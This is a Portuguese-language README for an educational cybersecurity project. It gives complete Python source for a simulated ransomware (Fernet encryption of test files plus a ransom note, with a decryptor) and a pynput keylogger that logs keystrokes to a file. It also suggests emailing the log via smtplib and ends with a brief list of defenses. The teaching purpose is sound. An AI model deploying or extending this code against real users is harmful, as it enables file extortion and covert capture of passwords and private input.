Este projeto demonstra, de forma prática, como funcionam dois tipos de malware comuns:

Ransomware → criptografa arquivos e exige “resgate”.

Keylogger → captura teclas digitadas e salva em arquivo.

⚠️ Aviso Importante: Este projeto é apenas para fins educacionais. Não execute em sistemas reais ou com dados sensíveis.

🗂️ Estrutura do Projeto
Código
📂 PROJETO-FINAL-CIBERSECURITY
 ┣ 📂 ransomware_simulado
 ┃ ┣ 📜 encrypt.py
 ┃ ┣ 📜 decrypt.py
 ┃ ┗ 📜 mensagem_resgate.txt
 ┣ 📂 keylogger_simulado
 ┃ ┣ 📜 keylogger.py
 ┃ ┗ 📜 log_teclas.txt
 ┣ 📂 docs
 ┃ ┗ 📜 reflexao_defesa.md
 ┗ 📜 README.md
🚀 Passo-a-Passo
1. Ransomware Simulado
encrypt.py

python
from cryptography.fernet import Fernet
import os

# Gera chave e salva
key = Fernet.generate_key()
with open("chave.key", "wb") as chave_file:
    chave_file.write(key)

fernet = Fernet(key)

# Criptografa arquivos de teste
for file in ["teste1.txt", "teste2.txt"]:
    with open(file, "rb") as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(file, "wb") as f:
        f.write(encrypted)

# Mensagem de resgate
with open("mensagem_resgate.txt", "w") as msg:
    msg.write("Seus arquivos foram criptografados!\nPague o resgate para recuperar.")
decrypt.py

python
from cryptography.fernet import Fernet

# Carrega chave
with open("chave.key", "rb") as chave_file:
    key = chave_file.read()

fernet = Fernet(key)

# Descriptografa arquivos
for file in ["teste1.txt", "teste2.txt"]:
    with open(file, "rb") as f:
        data = f.read()
    decrypted = fernet.decrypt(data)
    with open(file, "wb") as f:
        f.write(decrypted)
2. Keylogger Simulado
keylogger.py

python
from pynput import keyboard

def on_press(key):
    try:
        with open("log_teclas.txt", "a") as log:
            log.write(f"{key.char}\n")
    except AttributeError:
        with open("log_teclas.txt", "a") as log:
            log.write(f"{key}\n")

# Listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
Esse script captura teclas e salva em log_teclas.txt. Para simular envio por e-mail, você poderia adicionar um trecho com smtplib, mas sempre em ambiente controlado.

3. Reflexão sobre Defesa
No arquivo docs/reflexao_defesa.md, documente:

Antivírus → detecta comportamentos suspeitos.

Firewall → bloqueia conexões não autorizadas.

Sandboxing → executa programas em ambiente isolado.

Conscientização do usuário → evita abrir anexos ou links suspeitos.

🧪 Exemplos de Uso
bash
# Executar ransomware simulado
python encrypt.py
python decrypt.py

# Executar keylogger simulado
python keylogger.py
📌 Conclusão
Este projeto mostra, de forma prática e controlada, como funcionam Ransomware e Keylogger. Mais importante: reforça a necessidade de defesa e conscientização contra ataques digitais.
